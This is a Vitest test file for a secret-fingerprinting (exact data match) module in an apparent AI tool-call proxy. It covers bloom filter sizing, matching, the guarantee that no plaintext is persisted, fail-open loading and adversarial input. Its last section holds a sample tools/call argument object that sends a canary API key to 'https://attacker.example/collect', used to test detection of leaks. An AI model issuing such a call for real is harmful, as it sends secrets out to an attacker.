import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
  EdmIndex,
  bloomParams,
  buildAndWriteEdmIndex,
  buildEdmIndexData,
  fingerprintsDir,
  loadEdmIndexes,
  matchEdmIndexes,
} from '../../src/proxy/edm.js';

let tmpDir: string;

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'g0-proxy-edm-'));
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

function writeCorpus(lines: string[]): string {
  const file = path.join(tmpDir, 'corpus.txt');
  fs.writeFileSync(file, lines.join('\n') + '\n');
  return file;
}

// ─────────────────────────────────────────────────────────────────────────
// bloomParams — sizing formula sanity
// ─────────────────────────────────────────────────────────────────────────

describe('bloomParams', () => {
  it('grows the bitset with n and stays close to the theoretical target FP rate', () => {
    for (const n of [1, 10, 100, 1000, 10000]) {
      const p = 0.01;
      const { bits, hashCount } = bloomParams(n, p);
      expect(bits).toBeGreaterThan(0);
      expect(hashCount).toBeGreaterThanOrEqual(1);
      expect(hashCount).toBeLessThanOrEqual(16);

      // theoretical FP rate for an "ideal" bloom filter: (1 - e^(-k*n/m))^k
      const count = Math.max(1, n);
      const theoretical = Math.pow(1 - Math.exp((-hashCount * count) / bits), hashCount);
      // Sanity band, not exact equality: the formulas are integer-rounded
      // (bits/hashCount), so the achieved rate is a close neighbor of the
      // target, not identical to it.
      expect(theoretical).toBeLessThan(p * 3);
    }
  });

  it('never returns a degenerate (zero-size) filter for a 1-entry corpus', () => {
    const { bits, hashCount } = bloomParams(1);
    expect(bits).toBeGreaterThanOrEqual(64);
    expect(hashCount).toBeGreaterThanOrEqual(1);
  });

  it('clamps a pathological target FP rate to a sane range instead of throwing/producing NaN/Infinity', () => {
    for (const p of [0, -1, 2, NaN, Infinity]) {
      const { bits, hashCount } = bloomParams(100, p);
      expect(Number.isFinite(bits)).toBe(true);
      expect(Number.isFinite(hashCount)).toBe(true);
      expect(bits).toBeGreaterThan(0);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────
// Round trip: fingerprint a corpus, then match() finds each entry
// ─────────────────────────────────────────────────────────────────────────

describe('EdmIndex round trip (line mode)', () => {
  it('matches a fingerprinted secret embedded in arbitrary surrounding text', () => {
    const corpus = writeCorpus(['sk-live-CORPUS-SECRET-abcdef123456', 'db-password-hunter2-XyZ', 'user@example.com']);
    const outDir = path.join(tmpDir, 'fingerprints');
    const built = buildAndWriteEdmIndex(corpus, outDir, { name: 'test-secrets', mode: 'line' });

    expect(built.entryCount).toBe(3);
    expect(built.tokenCount).toBe(3);

    const index = EdmIndex.load(built.filePath);
    expect(index.size).toBe(3);

    // Each corpus line, embedded differently, must be found.
    const hit1 = index.match('the api key is "sk-live-CORPUS-SECRET-abcdef123456" in the config');
    expect(hit1.length).toBe(1);
    expect(hit1[0].indexName).toBe('test-secrets');
    expect(hit1[0].confidence).toBe(0.99);
    expect(hit1[0].signals).toContain('edm-exact-match');

    const hit2 = index.match('password: db-password-hunter2-XyZ\n');
    expect(hit2.length).toBe(1);

    const hit3 = index.match('contact user@example.com for details');
    expect(hit3.length).toBe(1);
  });

  it('does not match unrelated text', () => {
    const corpus = writeCorpus(['sk-live-CORPUS-SECRET-abcdef123456']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 's', mode: 'line' });
    const index = EdmIndex.load(built.filePath);

    expect(index.match('the quick brown fox jumps over the lazy dog')).toEqual([]);
    expect(index.match('sk-live-CORPUS-SECRET-abcdef123457')).toEqual([]); // off by one char
  });

  it('is case-sensitive for line mode (secrets are case-sensitive)', () => {
    const corpus = writeCorpus(['CaseSensitiveSecretValue123']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 's', mode: 'line' });
    const index = EdmIndex.load(built.filePath);

    expect(index.match('here is casesensitivesecretvalue123 lowercased')).toEqual([]);
    expect(index.match('here is CaseSensitiveSecretValue123 exact')).toHaveLength(1);
  });

  it('matches SHORT (2- and 3-char) fingerprinted whole-line values — DB dumps are full of state/status codes', () => {
    // Regression for the build/match asymmetry: the builder persisted any
    // non-empty line, but match-time applied a 4-char floor to whole-line
    // candidates, silently dropping short values. A whole line is a
    // deliberate fingerprint the operator chose; the MIN_TOKEN_LEN floor
    // exists only to suppress noisy short SHINGLE tokens, not these.
    const corpus = writeCorpus(['CA', 'xy9', 'US']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'codes', mode: 'line' });
    const index = EdmIndex.load(built.filePath);
    expect(index.size).toBe(3);

    // Each short value, appearing as its own (trimmed) line, must now match.
    // The whole-line path has no length floor; the inline run-pass floor
    // still applies, so short values match as their own line, not as short
    // inline fragments (that floor is the intentional noise suppressant).
    expect(index.match('state\nCA\nactive')).toHaveLength(1);
    expect(index.match('  xy9  \n')).toHaveLength(1); // trimmed whole line
    expect(index.match('CA\n')).toHaveLength(1);
    // A short value NOT in the corpus still doesn't match.
    expect(index.match('NY\n')).toEqual([]);
  });

  it('matches an unquoted KEY=value / KEY:value shape (.env / config dumps), not just quoted/space-separated forms', () => {
    // The delimiter regex intentionally keeps '=' and ':' inside a token
    // (to preserve base64 padding / timestamps), which meant a
    // fingerprinted `sk-...` did not match `apiKey=sk-...` glued together.
    // A second, additive extraction pass splits candidates on '='/':' so
    // the KEY=value shape is caught WITHOUT losing the base64/timestamp
    // matching (the un-split candidate is still checked).
    const secret = 'sk-abc123SECRETVALUE';
    const corpus = writeCorpus([secret]);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'env', mode: 'line' });
    const index = EdmIndex.load(built.filePath);

    expect(index.match(`apiKey=${secret}`)).toHaveLength(1);
    expect(index.match(`token: ${secret}`)).toHaveLength(1);
    expect(index.match(`token:${secret}`)).toHaveLength(1); // colon-glued, no space
    expect(index.match(`API_KEY=${secret}\nOTHER=noise`)).toHaveLength(1);
    // Still matches the quoted-JSON and space-separated forms it already did.
    expect(index.match(`"apiKey": "${secret}"`)).toHaveLength(1);
    expect(index.match(`the key is ${secret} ok`)).toHaveLength(1);
  });

  it('KEY=value splitting does not create false positives for a non-member value', () => {
    const corpus = writeCorpus(['sk-abc123SECRETVALUE']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'env', mode: 'line' });
    const index = EdmIndex.load(built.filePath);
    expect(index.match('apiKey=sk-abc123DIFFERENT')).toEqual([]);
  });

  it('still matches a fingerprinted value that itself contains an internal colon (URL/timestamp) — split is additive', () => {
    // The un-split candidate is always still checked, so a fingerprinted
    // value with internal ':' (e.g. a full URL) survives the new split pass.
    const secret = 'https://vault.internal.example:8443/prod-key-CANARY';
    const corpus = writeCorpus([secret]);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'urls', mode: 'line' });
    const index = EdmIndex.load(built.filePath);
    expect(index.match(`endpoint ${secret} configured`)).toHaveLength(1);
  });
});

describe('EdmIndex round trip (shingle mode)', () => {
  it('matches a verbatim word-fragment of a fingerprinted doc line, case-insensitively', () => {
    const corpus = writeCorpus(['The quarterly board memo discusses the confidential acquisition of NorthStar Inc.']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), {
      name: 'doc',
      mode: 'shingle',
      shingleSize: 5,
    });
    const index = EdmIndex.load(built.filePath);

    // A 5-word fragment lifted verbatim (different case) from the corpus line.
    const hit = index.match('As mentioned, THE CONFIDENTIAL ACQUISITION OF NORTHSTAR came up again today.');
    expect(hit.length).toBe(1);
    expect(hit[0].indexName).toBe('doc');
    expect(hit[0].confidence).toBe(0.99);
  });

  it('does not match unrelated prose', () => {
    const corpus = writeCorpus(['The quarterly board memo discusses the confidential acquisition of NorthStar Inc.']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'doc', mode: 'shingle' });
    const index = EdmIndex.load(built.filePath);

    expect(index.match('completely unrelated sentence about the weather today in Paris')).toEqual([]);
  });
});

// ─────────────────────────────────────────────────────────────────────────
// Plaintext must NEVER be persisted
// ─────────────────────────────────────────────────────────────────────────

describe('plaintext-never-persisted guarantee', () => {
  it('the written index file contains none of the corpus plaintext, in line mode', () => {
    const secrets = ['sk-live-UNIQUE-CANARY-VALUE-9f8e7d6c5b', 'password-hunter2-CANARY', 'ssn-123-45-6789-CANARY'];
    const corpus = writeCorpus(secrets);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'canary', mode: 'line' });

    const raw = fs.readFileSync(built.filePath, 'utf-8');
    for (const secret of secrets) {
      expect(raw.includes(secret)).toBe(false);
      // Also guard against a trivial base64 encoding of the plaintext leaking in.
      expect(raw.includes(Buffer.from(secret).toString('base64'))).toBe(false);
    }
  });

  it('the written index file contains none of the corpus plaintext, in shingle mode', () => {
    const line = 'The confidential CANARY-PHRASE-XYZ acquisition memo must never leak verbatim';
    const corpus = writeCorpus([line]);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'canary-doc', mode: 'shingle' });

    const raw = fs.readFileSync(built.filePath, 'utf-8');
    expect(raw.includes('CANARY-PHRASE-XYZ')).toBe(false);
    expect(raw.includes(line)).toBe(false);
    expect(raw.includes('confidential')).toBe(false);
  });

  it('the in-memory build structure (before it is even written) carries no plaintext either', () => {
    const secret = 'sk-live-INMEM-CANARY-abc123';
    const corpus = writeCorpus([secret]);
    const { data } = buildEdmIndexData(corpus, { name: 'x', mode: 'line' });

    const serialized = JSON.stringify(data);
    expect(serialized.includes(secret)).toBe(false);
    expect(data.hashes.every((h) => /^[0-9a-f]{64}$/.test(h))).toBe(true); // sha256 hex, not the raw value
  });
});

// ─────────────────────────────────────────────────────────────────────────
// Missing / corrupt file -> no-op, never throw
// ─────────────────────────────────────────────────────────────────────────

describe('fail-open on missing/corrupt fingerprint files', () => {
  it('EdmIndex.load never throws for a missing file, and the result matches nothing', () => {
    let index: EdmIndex | undefined;
    expect(() => {
      index = EdmIndex.load(path.join(tmpDir, 'does-not-exist.jsonl'));
    }).not.toThrow();
    expect(index!.size).toBe(0);
    expect(index!.match('anything at all, including sk-live-whatever')).toEqual([]);
  });

  it('EdmIndex.load never throws for garbage (non-JSON) file content', () => {
    const filePath = path.join(tmpDir, 'garbage.jsonl');
    fs.writeFileSync(filePath, 'this is not json {{{');
    let index: EdmIndex | undefined;
    expect(() => {
      index = EdmIndex.load(filePath);
    }).not.toThrow();
    expect(index!.size).toBe(0);
  });

  it('EdmIndex.load never throws for valid JSON with the wrong shape', () => {
    const filePath = path.join(tmpDir, 'wrong-shape.jsonl');
    fs.writeFileSync(filePath, JSON.stringify({ hello: 'world' }));
    let index: EdmIndex | undefined;
    expect(() => {
      index = EdmIndex.load(filePath);
    }).not.toThrow();
    expect(index!.size).toBe(0);
  });

  it('EdmIndex.load never throws for a truncated bloom bitset', () => {
    const filePath = path.join(tmpDir, 'truncated.jsonl');
    fs.writeFileSync(
      filePath,
      JSON.stringify({
        version: 1,
        name: 'bad',
        mode: 'line',
        salt: 'deadbeef',
        bloom: { bits: 100000, hashCount: 7, bitset: Buffer.from([1, 2, 3]).toString('base64') },
        hashes: ['a'.repeat(64)],
        count: 1,
      }),
    );
    let index: EdmIndex | undefined;
    expect(() => {
      index = EdmIndex.load(filePath);
    }).not.toThrow();
    expect(index!.size).toBe(0);
  });

  it('EdmIndex.match never throws even on an empty/no-op index', () => {
    const index = EdmIndex.empty();
    expect(() => index.match('')).not.toThrow();
    expect(() => index.match('x'.repeat(10000))).not.toThrow();
    expect(index.match('anything')).toEqual([]);
  });

  it('loadEdmIndexes returns [] (never throws) for a missing fingerprints directory', () => {
    let indexes: EdmIndex[] = [];
    expect(() => {
      indexes = loadEdmIndexes(path.join(tmpDir, 'no-such-proxy-dir'));
    }).not.toThrow();
    expect(indexes).toEqual([]);
  });

  it('matchEdmIndexes([]) is a true no-op, matching current (pre-EDM) behavior exactly', () => {
    expect(matchEdmIndexes([], 'sk-live-anything, secret data, whatever')).toEqual([]);
  });
});

// ─────────────────────────────────────────────────────────────────────────
// Bloom false positives are corrected by the exact hash set
// ─────────────────────────────────────────────────────────────────────────

describe('bloom false positives never produce a false EDM finding', () => {
  it('a deliberately collision-prone (high target FP rate) index still reports zero matches for non-member data', () => {
    const lines: string[] = [];
    for (let i = 0; i < 500; i++) lines.push(`corpus-entry-${i}-${'x'.repeat(20)}`);
    const corpus = writeCorpus(lines);
    // targetFpRate near the max clamp (0.5) intentionally shrinks the bitset
    // relative to n, driving up the bloom-level (not exact-level) collision
    // rate, to stress the "bloom says maybe, exact set says no" path.
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), {
      name: 'collision-prone',
      mode: 'line',
      targetFpRate: 0.5,
    });
    const index = EdmIndex.load(built.filePath);
    expect(index.size).toBe(500);

    const nonMemberText = Array.from({ length: 500 }, (_, i) => `not-in-corpus-${i}-${'y'.repeat(20)}`).join(' ');
    expect(index.match(nonMemberText)).toEqual([]);
  });
});

// ─────────────────────────────────────────────────────────────────────────
// Bounded work on adversarial/huge input
// ─────────────────────────────────────────────────────────────────────────

describe('bounded work on adversarial input', () => {
  it('never throws and stays fast on a huge, delimiter-dense adversarial line-mode input', () => {
    const corpus = writeCorpus(['sk-live-NEEDLE-CANARY-abcdef123456']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'needle', mode: 'line' });
    const index = EdmIndex.load(built.filePath);

    const filler = 'field_name_value,'.repeat(60000); // ~1MB of comma-delimited filler
    const start = Date.now();
    expect(() => index.match(filler)).not.toThrow();
    expect(Date.now() - start).toBeLessThan(2000);
  });

  it('stays well under 100ms on ~1MB of KEY=value-dense input (the additive KV-split pass is still bounded)', () => {
    // The KEY=value split pass roughly doubles the candidate count on
    // delimiter-dense input; this pins that it remains bounded — an
    // adversarial `.env`-shaped 1MB payload must not blow the hot-path
    // budget. Threshold is deliberately loose (100ms) to stay stable
    // across CI hardware while still catching any O(n²) regression.
    const corpus = writeCorpus(['sk-live-NEEDLE-CANARY-abcdef123456']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'needle', mode: 'line' });
    const index = EdmIndex.load(built.filePath);

    const kvFiller = 'API_KEY_NAME=some_value_here:more\n'.repeat(30000); // ~1MB, '='/':'-dense, multi-line
    const start = Date.now();
    const result = index.match(kvFiller, { maxScanBytes: 2_000_000 });
    const elapsed = Date.now() - start;
    expect(result).toEqual([]);
    expect(elapsed).toBeLessThan(100);
  });

  it('a real fingerprinted secret is still found regardless of how much filler precedes it (no evasion-by-padding)', () => {
    const corpus = writeCorpus(['sk-live-NEEDLE-CANARY-abcdef123456']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'needle', mode: 'line' });
    const index = EdmIndex.load(built.filePath);

    const filler = 'field_name_value,'.repeat(30000);
    const text = `${filler}"apiKey":"sk-live-NEEDLE-CANARY-abcdef123456"`;
    expect(index.match(text).length).toBe(1);
  });

  it('respects maxScanBytes — text over the budget is skipped entirely, not truncate-scanned', () => {
    const corpus = writeCorpus(['sk-live-NEEDLE-CANARY-abcdef123456']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'needle', mode: 'line' });
    const index = EdmIndex.load(built.filePath);

    const text = 'sk-live-NEEDLE-CANARY-abcdef123456';
    expect(index.match(text, { maxScanBytes: text.length - 1 })).toEqual([]);
    expect(index.match(text, { maxScanBytes: text.length })).toHaveLength(1);
  });

  it('never throws on adversarial shingle-mode input (huge word count)', () => {
    const corpus = writeCorpus(['some confidential doc line about a secret project']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'doc', mode: 'shingle' });
    const index = EdmIndex.load(built.filePath);

    const adversarial = 'word '.repeat(200000);
    const start = Date.now();
    expect(() => index.match(adversarial, { maxScanBytes: 5_000_000 })).not.toThrow();
    expect(Date.now() - start).toBeLessThan(3000);
  });

  it('EdmIndex.load never throws even given a directory instead of a file', () => {
    expect(() => EdmIndex.load(tmpDir)).not.toThrow();
  });
});

// ─────────────────────────────────────────────────────────────────────────
// fingerprintsDir / loadEdmIndexes — directory-level loading
// ─────────────────────────────────────────────────────────────────────────

describe('fingerprintsDir / loadEdmIndexes', () => {
  it('fingerprintsDir is <dir>/fingerprints', () => {
    expect(fingerprintsDir(tmpDir)).toBe(path.join(tmpDir, 'fingerprints'));
  });

  it('loads every *.jsonl file under the fingerprints dir and each is independently queryable', () => {
    const corpusAPath = path.join(tmpDir, 'corpusA.txt');
    fs.writeFileSync(corpusAPath, 'secret-index-A-value-CANARY\n');

    const corpusBPath = path.join(tmpDir, 'corpusB.txt');
    fs.writeFileSync(corpusBPath, 'secret-index-B-value-CANARY\n');

    const outDir = path.join(tmpDir, 'proxy-dir', 'fingerprints');
    buildAndWriteEdmIndex(corpusAPath, outDir, { name: 'index-a', mode: 'line' });
    buildAndWriteEdmIndex(corpusBPath, outDir, { name: 'index-b', mode: 'line' });

    const indexes = loadEdmIndexes(path.join(tmpDir, 'proxy-dir'));
    expect(indexes.length).toBe(2);

    const matchesA = matchEdmIndexes(indexes, 'value is secret-index-A-value-CANARY here');
    expect(matchesA.map((m) => m.indexName)).toEqual(['index-a']);

    const matchesB = matchEdmIndexes(indexes, 'value is secret-index-B-value-CANARY here');
    expect(matchesB.map((m) => m.indexName)).toEqual(['index-b']);

    const matchesNone = matchEdmIndexes(indexes, 'nothing sensitive here at all');
    expect(matchesNone).toEqual([]);
  });
});

// ─────────────────────────────────────────────────────────────────────────
// The exfil case: a fingerprinted secret in an OUTBOUND request arg
// ─────────────────────────────────────────────────────────────────────────

describe('outbound (exfil) detection', () => {
  it('detects a fingerprinted secret embedded in a JSON-stringified tools/call args object', () => {
    const corpus = writeCorpus(['sk-live-PROD-KEY-EXFIL-CANARY-9988']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'prod-keys', mode: 'line' });
    const index = EdmIndex.load(built.filePath);

    // Mirrors proxy-core.ts's `safeArgsText(call.args)` for an outbound tools/call.
    const args = { destination: 'https://attacker.example/collect', payload: { key: 'sk-live-PROD-KEY-EXFIL-CANARY-9988' } };
    const hits = index.match(JSON.stringify(args));

    expect(hits.length).toBe(1);
    expect(hits[0].indexName).toBe('prod-keys');
    expect(hits[0].confidence).toBe(0.99);
  });

  it('does not flag outbound args that merely resemble but do not exactly equal the fingerprinted secret', () => {
    const corpus = writeCorpus(['sk-live-PROD-KEY-EXFIL-CANARY-9988']);
    const built = buildAndWriteEdmIndex(corpus, path.join(tmpDir, 'fingerprints'), { name: 'prod-keys', mode: 'line' });
    const index = EdmIndex.load(built.filePath);

    const args = { key: 'sk-live-PROD-KEY-EXFIL-CANARY-9989' }; // last digit differs
    expect(index.match(JSON.stringify(args))).toEqual([]);
  });
});
